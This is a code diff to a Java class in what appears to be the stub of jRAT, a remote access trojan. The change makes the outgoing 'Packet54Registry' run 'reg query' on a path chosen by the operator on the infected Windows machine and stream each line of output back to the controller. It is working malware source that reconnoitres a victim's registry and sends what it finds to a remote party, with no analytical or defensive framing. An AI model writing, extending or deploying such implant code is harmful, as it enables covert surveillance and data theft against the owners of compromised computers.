@@ -1,27 +1,46 @@
 package se.jrat.stub.packets.outgoing;
 
+import java.io.BufferedReader;
 import java.io.DataOutputStream;
+import java.io.InputStreamReader;
 
 import se.jrat.common.io.StringWriter;
+
+import com.redpois0n.oslib.OperatingSystem;
 
 
 public class Packet54Registry extends AbstractOutgoingPacket {
 
 	private String path;
-	private String[] args;
 
-	public Packet54Registry(String path, String[] args) {
+	public Packet54Registry(String path) {
 		this.path = path;
-		this.args = args;
 	}
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		sw.writeLine(path);
-		dos.writeInt(args.length);
+		try {
+			sw.writeLine(path);
+			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
+				Process p = Runtime.getRuntime().exec(new String[] { "reg", "query", path });
 
-		for (String arg : args) {
-			sw.writeLine(arg);
+				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+
+				String line;
+
+				while ((line = reader.readLine()) != null) {
+					dos.writeBoolean(true);
+					sw.writeLine(line);
+					System.out.println(line);
+				}
+				reader.close();
+			} else {
+				throw new Exception("Windows only");
+			}
+			
+			dos.writeBoolean(false);
+		} catch (Exception ex) {
+			ex.printStackTrace(); //Connection.addToSendQueue(new Packet54Registry("", new String[] { "1", "Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage() }));
 		}
 	}
 
